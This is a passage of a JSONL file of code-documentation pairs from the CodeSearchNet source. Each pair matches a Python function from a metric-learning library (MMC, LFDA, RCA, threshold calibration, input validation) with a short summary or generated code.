= w / w_norm  # make `w` a unit vector\n    t1 = t / w_norm  # distance from origin to `w^T*x=t` plane\n\n    cycle = 1\n    alpha = 0.1  # initial step size along gradient\n    grad1 = self._fS1(pos_pairs, A)            # gradient of similarity\n    # constraint function\n    grad2 = self._fD1(neg_pairs, A)            # gradient of dissimilarity\n    # constraint function\n    M = self._grad_projection(grad1, grad2)  # gradient of fD1 orthogonal to fS1\n\n    A_old = A.copy()\n\n    for cycle in xrange(self.max_iter):\n\n      # projection of constraints C1 and C2\n      satisfy = False\n\n      for it in xrange(self.max_proj):\n\n        # First constraint:\n        # f(A) = \\sum_{i,j \\in S} d_ij' A d_ij <= t              (1)\n        # (1) can be rewritten as a linear constraint: w^T x = t,\n        # where x is the unrolled matrix of A,\n        # w is also an unrolled matrix of W where\n        # W_{kl}= \\sum_{i,j \\in S}d_ij^k * d_ij^l\n        x0 = A.ravel()\n        if w.dot(x0) <= t:\n          x = x0\n        else:\n          x = x0 + (t1 - w1.dot(x0)) * w1\n          A[:] = x.reshape(num_dim, num_dim)\n\n        # Second constraint:\n        # PSD constraint A >= 0\n        # project A onto domain A>0\n        l, V = np.linalg.eigh((A + A.T) / 2)\n        A[:] = np.dot(V * np.maximum(0, l[None,:]), V.T)\n\n        fDC2 = w.dot(A.ravel())\n        error2 = (fDC2 - t) / t\n        if error2 < eps:\n          satisfy = True\n          break\n\n      # third constraint: gradient ascent\n      # max: g(A) >= 1\n      # here we suppose g(A) = fD(A) = \\sum_{I,J \\in D} sqrt(d_ij' A d_ij)\n\n      obj_previous = self._fD(neg_pairs, A_old)  # g(A_old)\n      obj = self._fD(neg_pairs, A)               # g(A)\n\n      if satisfy and (obj > obj_previous or cycle == 0):\n\n        # If projection of 1 and 2 is successful, and such projection\n        # improves objective function, slightly increase learning rate\n        # and update from the current A.\n        alpha *= 1.05\n        A_old[:] = A\n        grad2 = self._fS1(pos_pairs, A)\n        grad1 = self._fD1(neg_pairs, A)\n        M = self._grad_projection(grad1, grad2)\n        A += alpha * M\n\n      else:\n\n        # If projection of 1 and 2 failed, or obj <= obj_previous due\n        # to projection of 1 and 2, shrink learning rate and re-update\n        # from the previous A.\n        alpha /= 2\n        A[:] = A_old + alpha * M\n\n      delta = np.linalg.norm(alpha * M) / np.linalg.norm(A_old)\n      if delta < self.convergence_threshold:\n        break\n      if self.verbose:\n        print('mmc iter: %d, conv = %f, projections = %d' % (cycle, delta, it+1))\n\n    if delta > self.convergence_threshold:\n      self.converged_ = False\n      if self.verbose:\n        print('mmc did not converge, conv = %f' % (delta,))\n    else:\n      self.converged_ = True\n      if self.verbose:\n        print('mmc converged at iter %d, conv = %f' % (cycle, delta))\n    self.A_[:] = A_old\n    self.n_iter_ = cycle\n\n    self.transformer_ = transformer_from_metric(self.A_)\n    return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _fit_diag(self, pairs, y):\n    num_dim = pairs.shape[2]\n    pos_pairs, neg_pairs = pairs[y == 1], pairs[y == -1]\n    s_sum = np.sum((pos_pairs[:, 0, :] - pos_pairs[:, 1, :]) ** 2, axis=0)\n\n    it = 0\n    error = 1.0\n    eps = 1e-6\n    reduction = 2.0\n    w = np.diag(self.A_).copy()\n\n    while error > self.convergence_threshold and it < self.max_iter:\n\n      fD0, fD_1st_d, fD_2nd_d = self._D_constraint(neg_pairs, w)\n      obj_initial = np.dot(s_sum, w) + self.diagonal_c * fD0\n      fS_1st_d = s_sum  # first derivative of the similarity constraints\n\n      gradient = fS_1st_d - self.diagonal_c * fD_1st_d               # gradient of the objective\n      hessian = -self.diagonal_c * fD_2nd_d + eps * np.eye(num_dim)  # Hessian of the objective\n      step = np.dot(np.linalg.inv(hessian), gradient)\n\n      # Newton-Rapshon update\n      # search over optimal lambda\n      lambd = 1  # initial step-size\n      w_tmp = np.maximum(0, w - lambd * step)\n      obj = (np.dot(s_sum, w_tmp) + self.diagonal_c *\n             self._D_objective(neg_pairs, w_tmp))\n      assert_all_finite(obj)\n      obj_previous = obj + 1  # just to get the while-loop started\n\n      inner_it = 0\n      while obj < obj_previous:\n        obj_previous = obj\n        w_previous = w_tmp.copy()\n        lambd /= reduction\n        w_tmp = np.maximum(0, w - lambd * step)\n        obj = (np.dot(s_sum, w_tmp) + self.diagonal_c *\n               self._D_objective(neg_pairs, w_tmp))\n        inner_it += 1\n        assert_all_finite(obj)\n\n      w[:] = w_previous\n      error = np.abs((obj_previous - obj_initial) / obj_previous)\n      if self.verbose:\n        print('mmc iter: %d, conv = %f' % (it, error))\n      it += 1\n\n    self.A_ = np.diag(w)\n\n    self.transformer_ = transformer_from_metric(self.A_)\n    return self", "response": "Learn diagonal metric using MMC."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _fD(self, neg_pairs, A):\n    diff = neg_pairs[:, 0, :] - neg_pairs[:, 1, :]\n    return np.log(np.sum(np.sqrt(np.sum(np.dot(diff, A) * diff, axis=1))) + 1e-6)", "response": "The value of the dissimilarity constraint function."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _fD1(self, neg_pairs, A):\n    dim = neg_pairs.shape[2]\n    diff = neg_pairs[:, 0, :] - neg_pairs[:, 1, :]\n    # outer products of all rows in `diff`\n    M = np.einsum('ij,ik->ijk', diff, diff)\n    # faster version of: dist = np.sqrt(np.sum(M * A[None,:,:], axis=(1,2)))\n    dist = np.sqrt(np.einsum('ijk,jk', M, A))\n    # faster version of: sum_deri = np.sum(M / (2 * (dist[:,None,None] + 1e-6)), axis=0)\n    sum_deri = np.einsum('ijk,i->jk', M, 0.5 / (dist + 1e-6))\n    sum_dist = dist.sum()\n    return sum_deri / (sum_dist + 1e-6)", "response": "The gradient of the dissimilarity constraint function w. r. t. A."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _fS1(self, pos_pairs, A):\n    dim = pos_pairs.shape[2]\n    diff = pos_pairs[:, 0, :] - pos_pairs[:, 1, :]\n    return np.einsum('ij,ik->jk', diff, diff)", "response": "The gradient of the similarity constraint function w. r. t. A."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the value 1st derivative second derivative of a dissimilarity constraint function gF ( sum_ij distance w", "response": "def _D_constraint(self, neg_pairs, w):\n    \"\"\"Compute the value, 1st derivative, second derivative (Hessian) of\n    a dissimilarity constraint function gF(sum_ij distance(d_ij A d_ij))\n    where A is a diagonal matrix (in the form of a column vector 'w').\n    \"\"\"\n    diff = neg_pairs[:, 0, :] - neg_pairs[:, 1, :]\n    diff_sq = diff * diff\n    dist = np.sqrt(diff_sq.dot(w))\n    sum_deri1 = np.einsum('ij,i', diff_sq, 0.5 / np.maximum(dist, 1e-6))\n    sum_deri2 = np.einsum(\n        'ij,ik->jk',\n        diff_sq,\n        diff_sq / (-4 * np.maximum(1e-6, dist**3))[:,None]\n    )\n    sum_dist = dist.sum()\n    return (\n      np.log(sum_dist),\n      sum_deri1 / sum_dist,\n      sum_deri2 / sum_dist - np.outer(sum_deri1, sum_deri1) / (sum_dist * sum_dist)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fit(self, pairs, y, calibration_params=None):\n    calibration_params = (calibration_params if calibration_params is not\n                          None else dict())\n    self._validate_calibration_params(**calibration_params)\n    self._fit(pairs, y)\n    self.calibrate_threshold(pairs, y, **calibration_params)\n    return self", "response": "Learn the MMC model."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fit(self, X, y, random_state=np.random):\n    if self.num_labeled != 'deprecated':\n      warnings.warn('\"num_labeled\" parameter is not used.'\n                    ' It has been deprecated in version 0.5.0 and will be'\n                    'removed in 0.6.0', DeprecationWarning)\n    X, y = self._prepare_inputs(X, y, ensure_min_samples=2)\n    num_constraints = self.num_constraints\n    if num_constraints is None:\n      num_classes = len(np.unique(y))\n      num_constraints = 20 * num_classes**2\n\n    c = Constraints(y)\n    pos_neg = c.positive_negative_pairs(num_constraints,\n                                        random_state=random_state)\n    pairs, y = wrap_pairs(X, pos_neg)\n    return _BaseMMC._fit(self, pairs, y)", "response": "Fits the MMC model to the data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fit(self, X, y):\n    '''Fit the LFDA model.\n\n    Parameters\n    ----------\n    X : (n, d) array-like\n        Input data.\n\n    y : (n,) array-like\n        Class labels, one per point of data.\n    '''\n    X, y = self._prepare_inputs(X, y, ensure_min_samples=2)\n    unique_classes, y = np.unique(y, return_inverse=True)\n    n, d = X.shape\n    num_classes = len(unique_classes)\n\n    if self.num_dims is None:\n      dim = d\n    else:\n      if not 0 < self.num_dims <= d:\n        raise ValueError('Invalid num_dims, must be in [1,%d]' % d)\n      dim = self.num_dims\n\n    if self.k is None:\n      k = min(7, d - 1)\n    elif self.k >= d:\n      warnings.warn('Chosen k (%d) too large, using %d instead.' % (self.k,d-1))\n      k = d - 1\n    else:\n      k = int(self.k)\n    tSb = np.zeros((d,d))\n    tSw = np.zeros((d,d))\n\n    for c in xrange(num_classes):\n      Xc = X[y==c]\n      nc = Xc.shape[0]\n\n      # classwise affinity matrix\n      dist = pairwise_distances(Xc, metric='l2', squared=True)\n      # distances to k-th nearest neighbor\n      k = min(k, nc - 1)\n      sigma = np.sqrt(np.partition(dist, k, axis=0)[:, k])\n\n      local_scale = np.outer(sigma, sigma)\n      with np.errstate(divide='ignore', invalid='ignore'):\n        A = np.exp(-dist/local_scale)\n        A[local_scale==0] = 0\n\n      G = Xc.T.dot(A.sum(axis=0)[:,None] * Xc) - Xc.T.dot(A).dot(Xc)\n      tSb += G/n + (1-nc/n)*Xc.T.dot(Xc) + _sum_outer(Xc)/n\n      tSw += G/nc\n\n    tSb -= _sum_outer(X)/n - tSw\n\n    # symmetrize\n    tSb = (tSb + tSb.T) / 2\n    tSw = (tSw + tSw.T) / 2\n\n    vals, vecs = _eigh(tSb, tSw, dim)\n    order = np.argsort(-vals)[:dim]\n    vals = vals[order].real\n    vecs = vecs[:,order]\n\n    if self.embedding_type == 'weighted':\n       vecs *= np.sqrt(vals)\n    elif self.embedding_type == 'orthonormalized':\n       vecs, _ = np.linalg.qr(vecs)\n\n    self.transformer_ = vecs.T\n    return self", "response": "Fit the LFDA model to the data."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _prepare_inputs(self, X, y=None, type_of_inputs='classic',\n                      **kwargs):\n    \"\"\"Initializes the preprocessor and processes inputs. See `check_input`\n    for more details.\n\n    Parameters\n    ----------\n    input: array-like\n      The input data array to check.\n\n    y : array-like\n      The input labels array to check.\n\n    type_of_inputs: `str` {'classic', 'tuples'}\n      The type of inputs to check. If 'classic', the input should be\n      a 2D array-like of points or a 1D array like of indicators of points. If\n      'tuples', the input should be a 3D array-like of tuples or a 2D\n      array-like of indicators of tuples.\n\n    **kwargs: dict\n      Arguments to pass to check_input.\n\n    Returns\n    -------\n    X : `numpy.ndarray`\n      The checked input data array.\n\n    y: `numpy.ndarray` (optional)\n      The checked input labels array.\n    \"\"\"\n    self.check_preprocessor()\n    return check_input(X, y,\n                       type_of_inputs=type_of_inputs,\n                       preprocessor=self.preprocessor_,\n                       estimator=self,\n                       tuple_size=getattr(self, '_tuple_size', None),\n                       **kwargs)", "response": "Initializes the preprocessor and processes inputs."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the learned Mahalanobis distance between pairs.", "response": "def score_pairs(self, pairs):\n    \"\"\"Returns the learned Mahalanobis distance between pairs.\n\n    This distance is defined as: :math:`d_M(x, x') = \\sqrt{(x-x')^T M (x-x')}`\n    where ``M`` is the learned Mahalanobis matrix, for every pair of points\n    ``x`` and ``x'``. This corresponds to the euclidean distance between\n    embeddings of the points in a new space, obtained through a linear\n    transformation. Indeed, we have also: :math:`d_M(x, x') = \\sqrt{(x_e -\n    x_e')^T (x_e- x_e')}`, with :math:`x_e = L x` (See\n    :class:`MahalanobisMixin`).\n\n    Parameters\n    ----------\n    pairs : array-like, shape=(n_pairs, 2, n_features) or (n_pairs, 2)\n      3D Array of pairs to score, with each row corresponding to two points,\n      for 2D array of indices of pairs if the metric learner uses a\n      preprocessor.\n\n    Returns\n    -------\n    scores: `numpy.ndarray` of shape=(n_pairs,)\n      The learned Mahalanobis distance for every pair.\n\n    See Also\n    --------\n    get_metric : a method that returns a function to compute the metric between\n      two points. The difference with `score_pairs` is that it works on two 1D\n      arrays and cannot use a preprocessor. Besides, the returned function is\n      independent of the metric learner and hence is not modified if the metric\n      learner is.\n\n    :ref:`mahalanobis_distances` : The section of the project documentation\n      that describes Mahalanobis Distances.\n    \"\"\"\n    pairs = check_input(pairs, type_of_inputs='tuples',\n                        preprocessor=self.preprocessor_,\n                        estimator=self, tuple_size=2)\n    pairwise_diffs = self.transform(pairs[:, 1, :] - pairs[:, 0, :])\n    # (for MahalanobisMixin, the embedding is linear so we can just embed the\n    # difference)\n    return np.sqrt(np.sum(pairwise_diffs**2, axis=-1))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nembedding samples in X into a new learned linear embedding space.", "response": "def transform(self, X):\n    \"\"\"Embeds data points in the learned linear embedding space.\n\n    Transforms samples in ``X`` into ``X_embedded``, samples inside a new\n    embedding space such that: ``X_embedded = X.dot(L.T)``, where ``L`` is\n    the learned linear transformation (See :class:`MahalanobisMixin`).\n\n    Parameters\n    ----------\n    X : `numpy.ndarray`, shape=(n_samples, n_features)\n      The data points to embed.\n\n    Returns\n    -------\n    X_embedded : `numpy.ndarray`, shape=(n_samples, num_dims)\n      The embedded data points.\n    \"\"\"\n    X_checked = check_input(X, type_of_inputs='classic', estimator=self,\n                             preprocessor=self.preprocessor_,\n                             accept_sparse=True)\n    return X_checked.dot(self.transformer_.T)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef predict(self, pairs):\n    check_is_fitted(self, ['threshold_', 'transformer_'])\n    return 2 * (- self.decision_function(pairs) <= self.threshold_) - 1", "response": "Predicts the learned metric between samples in every pair."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef decision_function(self, pairs):\n    pairs = check_input(pairs, type_of_inputs='tuples',\n                        preprocessor=self.preprocessor_,\n                        estimator=self, tuple_size=self._tuple_size)\n    return - self.score_pairs(pairs)", "response": "Returns the decision function used to classify the pairs."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef calibrate_threshold(self, pairs_valid, y_valid, strategy='accuracy',\n                          min_rate=None, beta=1.):\n    \"\"\"Decision threshold calibration for pairwise binary classification\n\n    Method that calibrates the decision threshold (cutoff point) of the metric\n    learner. This threshold will then be used when calling the method\n    `predict`. The methods for picking cutoff points make use of traditional\n    binary classification evaluation statistics such as the true positive and\n    true negative rates and F-scores. The threshold will be found to maximize\n    the chosen score on the validation set ``(pairs_valid, y_valid)``.\n\n    See more in the :ref:`User Guide <calibration>`.\n\n    Parameters\n    ----------\n    strategy : str, optional (default='accuracy')\n      The strategy to use for choosing the cutoff threshold.\n\n      'accuracy'\n          Selects a decision threshold that maximizes the accuracy.\n      'f_beta'\n          Selects a decision threshold that maximizes the f_beta score,\n          with beta given by the parameter `beta`.\n      'max_tpr'\n          Selects a decision threshold that yields the highest true positive\n          rate with true negative rate at least equal to the value of the\n          parameter `min_rate`.\n      'max_tnr'\n          Selects a decision threshold that yields the highest true negative\n          rate with true positive rate at least equal to the value of the\n          parameter `min_rate`.\n\n    beta : float in [0, 1], optional (default=None)\n      Beta value to be used in case strategy == 'f_beta'.\n\n    min_rate : float in [0, 1] or None, (default=None)\n      In case strategy is 'max_tpr' or 'max_tnr' this parameter must be set\n      to specify the minimal value for the true negative rate or true positive\n      rate respectively that needs to be achieved.\n\n    pairs_valid : array-like, shape=(n_pairs_valid, 2, n_features)\n      The validation set of pairs to use to set the threshold.\n\n    y_valid : array-like, shape=(n_pairs_valid,)\n      The labels of the pairs of the validation set to use to set the\n      threshold. They must be +1 for positive pairs and -1 for negative pairs.\n\n    References\n    ----------\n    .. [1] Receiver-operating characteristic (ROC) plots: a fundamental\n           evaluation tool in clinical medicine, MH Zweig, G Campbell -\n           Clinical chemistry, 1993\n\n    .. [2] most of the code of this function is from scikit-learn's PR #10117\n\n    See Also\n    --------\n    sklearn.calibration : scikit-learn's module for calibrating classifiers\n    \"\"\"\n\n    self._validate_calibration_params(strategy, min_rate, beta)\n\n    pairs_valid, y_valid = self._prepare_inputs(pairs_valid, y_valid,\n                                                type_of_inputs='tuples')\n\n    n_samples = pairs_valid.shape[0]\n    if strategy == 'accuracy':\n      scores = self.decision_function(pairs_valid)\n      scores_sorted_idces = np.argsort(scores)[::-1]\n      scores_sorted = scores[scores_sorted_idces]\n      # true labels ordered by decision_function value: (higher first)\n      y_ordered = y_valid[scores_sorted_idces]\n      # we need to add a threshold that will reject all points\n      scores_sorted = np.concatenate([[scores_sorted[0] + 1], scores_sorted])\n\n      # finds the threshold that maximizes the accuracy:\n      cum_tp = stable_cumsum(y_ordered == 1)  # cumulative number of true\n      # positives\n      # we need to add the point where all samples are rejected:\n      cum_tp = np.concatenate([[0.], cum_tp])\n      cum_tn_inverted = stable_cumsum(y_ordered[::-1] == -1)\n      cum_tn = np.concatenate([[0.], cum_tn_inverted])[::-1]\n      cum_accuracy = (cum_tp + cum_tn) / n_samples\n      imax = np.argmax(cum_accuracy)\n      # we set the threshold to the lowest accepted score\n      # note: we are working with negative distances but we want the threshold\n      # to be with respect to the actual distances so we take minus sign\n      self.threshold_ = - scores_sorted[imax]\n      # note: if the best is to reject all points it's already one of the\n      # thresholds (scores_sorted[0])\n      return self\n\n    if strategy == 'f_beta':\n      precision, recall, thresholds = precision_recall_curve(\n          y_valid, self.decision_function(pairs_valid), pos_label=1)\n\n      # here the thresholds are decreasing\n      # We ignore the warnings here, in the same taste as\n      # https://github.com/scikit-learn/scikit-learn/blob/62d205980446a1abc1065\n      # f4332fd74eee57fcf73/sklearn/metrics/classification.py#L1284\n      with np.errstate(divide='ignore', invalid='ignore'):\n        f_beta = ((1 + beta**2) * (precision * recall) /\n                  (beta**2 * precision + recall))\n      # We need to set nans to zero otherwise they will be considered higher\n      # than the others (also discussed in https://github.com/scikit-learn/\n      # scikit-learn/pull/10117/files#r262115773)\n      f_beta[np.isnan(f_beta)] = 0.\n      imax = np.argmax(f_beta)\n      # we set the threshold to the lowest accepted score\n      # note: we are working with negative distances but we want the threshold\n      # to be with respect to the actual distances so we take minus sign\n      self.threshold_ = - thresholds[imax]\n      # Note: we don't need to deal with rejecting all points (i.e. threshold =\n      # max_scores + 1), since this can never happen to be optimal\n      # (see a more detailed discussion in test_calibrate_threshold_extreme)\n      return self\n\n    fpr, tpr, thresholds = roc_curve(y_valid,\n                                     self.decision_function(pairs_valid),\n                                     pos_label=1)\n    # here the thresholds are decreasing\n    fpr, tpr, thresholds = fpr, tpr, thresholds\n\n    if strategy in ['max_tpr', 'max_tnr']:\n      if strategy == 'max_tpr':\n        indices = np.where(1 - fpr >= min_rate)[0]\n        imax = np.argmax(tpr[indices])\n\n      if strategy == 'max_tnr':\n        indices = np.where(tpr >= min_rate)[0]\n        imax = np.argmax(1 - fpr[indices])\n\n      imax_valid = indices[imax]\n      # note: we are working with negative distances but we want the threshold\n      # to be with respect to the actual distances so we take minus sign\n      if indices[imax] == len(thresholds):  # we want to accept everything\n        self.threshold_ = - (thresholds[imax_valid] - 1)\n      else:\n        # thanks to roc_curve, the first point will always be max_scores\n        # + 1, see: https://github.com/scikit-learn/scikit-learn/pull/13523\n        self.threshold_ = - thresholds[imax_valid]\n      return self", "response": "This method calibrates the decision threshold of a pairwise binary classification learner."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nensure that calibration parameters have allowed values", "response": "def _validate_calibration_params(strategy='accuracy', min_rate=None,\n                                   beta=1.):\n    \"\"\"Ensure that calibration parameters have allowed values\"\"\"\n    if strategy not in ('accuracy', 'f_beta', 'max_tpr',\n                        'max_tnr'):\n      raise ValueError('Strategy can either be \"accuracy\", \"f_beta\" or '\n                       '\"max_tpr\" or \"max_tnr\". Got \"{}\" instead.'\n                       .format(strategy))\n    if strategy == 'max_tpr' or strategy == 'max_tnr':\n      if (min_rate is None or not isinstance(min_rate, (int, float)) or\n              not min_rate >= 0 or not min_rate <= 1):\n        raise ValueError('Parameter min_rate must be a number in'\n                         '[0, 1]. '\n                         'Got {} instead.'.format(min_rate))\n    if strategy == 'f_beta':\n      if beta is None or not isinstance(beta, (int, float)):\n        raise ValueError('Parameter beta must be a real number. '\n                         'Got {} instead.'.format(type(beta)))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef predict(self, quadruplets):\n    check_is_fitted(self, 'transformer_')\n    quadruplets = check_input(quadruplets, type_of_inputs='tuples',\n                              preprocessor=self.preprocessor_,\n                              estimator=self, tuple_size=self._tuple_size)\n    return np.sign(self.decision_function(quadruplets))", "response": "Predicts the ordering between sample distances in input quadruplets."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _inv_sqrtm(x):\n  '''Computes x^(-1/2)'''\n  vals, vecs = np.linalg.eigh(x)\n  return (vecs / np.sqrt(vals)).dot(vecs.T)", "response": "Computes x^ - 1 / 2"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fit(self, X, chunks):\n    X = self._prepare_inputs(X, ensure_min_samples=2)\n\n    # PCA projection to remove noise and redundant information.\n    if self.pca_comps is not None:\n      pca = decomposition.PCA(n_components=self.pca_comps)\n      X_t = pca.fit_transform(X)\n      M_pca = pca.components_\n    else:\n      X_t = X - X.mean(axis=0)\n      M_pca = None\n\n    chunks = np.asanyarray(chunks, dtype=int)\n    chunk_mask, chunked_data = _chunk_mean_centering(X_t, chunks)\n\n    inner_cov = np.atleast_2d(np.cov(chunked_data, rowvar=0, bias=1))\n    dim = self._check_dimension(np.linalg.matrix_rank(inner_cov), X_t)\n\n    # Fisher Linear Discriminant projection\n    if dim < X_t.shape[1]:\n      total_cov = np.cov(X_t[chunk_mask], rowvar=0)\n      tmp = np.linalg.lstsq(total_cov, inner_cov)[0]\n      vals, vecs = np.linalg.eig(tmp)\n      inds = np.argsort(vals)[:dim]\n      A = vecs[:, inds]\n      inner_cov = np.atleast_2d(A.T.dot(inner_cov).dot(A))\n      self.transformer_ = _inv_sqrtm(inner_cov).dot(A.T)\n    else:\n      self.transformer_ = _inv_sqrtm(inner_cov).T\n\n    if M_pca is not None:\n        self.transformer_ = np.atleast_2d(self.transformer_.dot(M_pca))\n\n    return self", "response": "Learn the RCA model."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfitting the RCA model to the data.", "response": "def fit(self, X, y, random_state=np.random):\n    \"\"\"Create constraints from labels and learn the RCA model.\n    Needs num_constraints specified in constructor.\n\n    Parameters\n    ----------\n    X : (n x d) data matrix\n        each row corresponds to a single instance\n    y : (n) data labels\n    random_state : a random.seed object to fix the random_state if needed.\n    \"\"\"\n    X, y = self._prepare_inputs(X, y, ensure_min_samples=2)\n    chunks = Constraints(y).chunks(num_chunks=self.num_chunks,\n                                   chunk_size=self.chunk_size,\n                                   random_state=random_state)\n    return RCA.fit(self, X, chunks)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncheck that the input format is valid and converts it if necessary.", "response": "def check_input(input_data, y=None, preprocessor=None,\r\n                type_of_inputs='classic', tuple_size=None, accept_sparse=False,\r\n                dtype='numeric', order=None,\r\n                copy=False, force_all_finite=True,\r\n                multi_output=False, ensure_min_samples=1,\r\n                ensure_min_features=1, y_numeric=False,\r\n                warn_on_dtype=False, estimator=None):\r\n  \"\"\"Checks that the input format is valid, and converts it if specified\r\n  (this is the equivalent of scikit-learn's `check_array` or `check_X_y`).\r\n  All arguments following tuple_size are scikit-learn's `check_X_y`\r\n  arguments that will be enforced on the data and labels array. If\r\n  indicators are given as an input data array, the returned data array\r\n  will be the formed points/tuples, using the given preprocessor.\r\n\r\n  Parameters\r\n  ----------\r\n  input : array-like\r\n    The input data array to check.\r\n\r\n  y : array-like\r\n    The input labels array to check.\r\n\r\n  preprocessor : callable (default=`None`)\r\n    The preprocessor to use. If None, no preprocessor is used.\r\n\r\n  type_of_inputs : `str` {'classic', 'tuples'}\r\n    The type of inputs to check. If 'classic', the input should be\r\n    a 2D array-like of points or a 1D array like of indicators of points. If\r\n    'tuples', the input should be a 3D array-like of tuples or a 2D\r\n    array-like of indicators of tuples.\r\n\r\n  accept_sparse : `bool`\r\n    Set to true to allow sparse inputs (only works for sparse inputs with\r\n    dim < 3).\r\n\r\n  tuple_size : int\r\n    The number of elements in a tuple (e.g. 2 for pairs).\r\n\r\n  dtype : string, type, list of types or None (default='numeric')\r\n    Data type of result. If None, the dtype of the input is preserved.\r\n    If 'numeric', dtype is preserved unless array.dtype is object.\r\n    If dtype is a list of types, conversion on the first type is only\r\n    performed if the dtype of the input is not in the list.\r\n\r\n  order : 'F', 'C' or None (default=`None`)\r\n    Whether an array will be forced to be fortran or c-style.\r\n\r\n  copy : boolean (default=False)\r\n    Whether a forced copy will be triggered. If copy=False, a copy might\r\n    be triggered by a conversion.\r\n\r\n  force_all_finite : boolean or 'allow-nan', (default=True)\r\n    Whether to raise an error on np.inf and np.nan in X. This parameter\r\n    does not influence whether y can have np.inf or np.nan values.\r\n    The possibilities are:\r\n     - True: Force all values of X to be finite.\r\n     - False: accept both np.inf and np.nan in X.\r\n     - 'allow-nan':  accept  only  np.nan  values in  X.  Values  cannot  be\r\n       infinite.\r\n\r\n  ensure_min_samples : int (default=1)\r\n    Make sure that X has a minimum number of samples in its first\r\n    axis (rows for a 2D array).\r\n\r\n  ensure_min_features : int (default=1)\r\n    Make sure that the 2D array has some minimum number of features\r\n    (columns). The default value of 1 rejects empty datasets.\r\n    This check is only enforced when X has effectively 2 dimensions or\r\n    is originally 1D and ``ensure_2d`` is True. Setting to 0 disables\r\n    this check.\r\n\r\n  warn_on_dtype : boolean (default=False)\r\n    Raise DataConversionWarning if the dtype of the input data structure\r\n    does not match the requested dtype, causing a memory copy.\r\n\r\n  estimator : str or estimator instance (default=`None`)\r\n    If passed, include the name of the estimator in warning messages.\r\n\r\n  Returns\r\n  -------\r\n  X : `numpy.ndarray`\r\n    The checked input data array.\r\n\r\n  y: `numpy.ndarray` (optional)\r\n    The checked input labels array.\r\n  \"\"\"\r\n\r\n  context = make_context(estimator)\r\n\r\n  args_for_sk_checks = dict(accept_sparse=accept_sparse,\r\n                            dtype=dtype, order=order,\r\n                            copy=copy, force_all_finite=force_all_finite,\r\n                            ensure_min_samples=ensure_min_samples,\r\n                            ensure_min_features=ensure_min_features,\r\n                            warn_on_dtype=warn_on_dtype, estimator=estimator)\r\n\r\n  # We need to convert input_data into a numpy.ndarray if possible, before\r\n  # any further checks or conversions, and deal with y if needed. Therefore\r\n  # we use check_array/check_X_y with fixed permissive arguments.\r\n  if y is None:\r\n    input_data = check_array(input_data, ensure_2d=False, allow_nd=True,\r\n                             copy=False, force_all_finite=False,\r\n                             accept_sparse=True, dtype=None,\r\n                             ensure_min_features=0, ensure_min_samples=0)\r\n  else:\r\n    input_data, y = check_X_y(input_data, y, ensure_2d=False, allow_nd=True,\r\n                              copy=False, force_all_finite=False,\r\n                              accept_sparse=True, dtype=None,\r\n                              ensure_min_features=0, ensure_min_samples=0,\r\n                              multi_output=multi_output,\r\n                              y_numeric=y_numeric)\r\n\r\n  if type_of_inputs == 'classic':\r\n    input_data = check_input_classic(input_data, context, preprocessor,\r\n                                     args_for_sk_checks)\r\n\r\n  elif type_of_inputs == 'tuples':\r\n    input_data = check_input_tuples(input_data, context, preprocessor,\r\n                                    args_for_sk_checks, tuple_size)\r\n\r\n  else:\r\n    raise ValueError(\"Unknown value {} for type_of_inputs. Valid values are \"\r\n                     \"'classic' or 'tuples'.\".format(type_of_inputs))\r\n\r\n  return input_data if y is None else (input_data, y)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef preprocess_points(points, preprocessor):\r\n  try:\r\n    points = preprocessor(points)\r\n  except Exception as e:\r\n    raise PreprocessorError(e)\r\n  return points", "response": "form points as such"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if some of the eigenvalues given are negative up to a default value of the tolerance.", "response": "def _check_sdp_from_eigen(w, tol=None):\r\n  \"\"\"Checks if some of the eigenvalues given are negative, up to a tolerance\r\n  level, with a default value of the tolerance depending on the eigenvalues.\r\n\r\n  Parameters\r\n  ----------\r\n  w : array-like, shape=(n_eigenvalues,)\r\n    Eigenvalues to check for non semidefinite positiveness.\r\n\r\n  tol : positive `float`, optional\r\n    Negative eigenvalues above - tol are considered zero. If\r\n    tol is None, and eps is the epsilon value for datatype of w, then tol\r\n    is set to w.max() * len(w) * eps.\r\n\r\n  See Also\r\n  --------\r\n  np.linalg.matrix_rank for more details on the choice of tolerance (the same\r\n    strategy is applied here)\r\n  \"\"\"\r\n  if tol is None:\r\n    tol = w.max() * len(w) * np.finfo(w.dtype).eps\r\n  if tol < 0:\r\n    raise ValueError(\"tol should be positive.\")\r\n  if any(w < - tol):\r\n      raise ValueError(\"Matrix is not positive semidefinite (PSD).\")"}
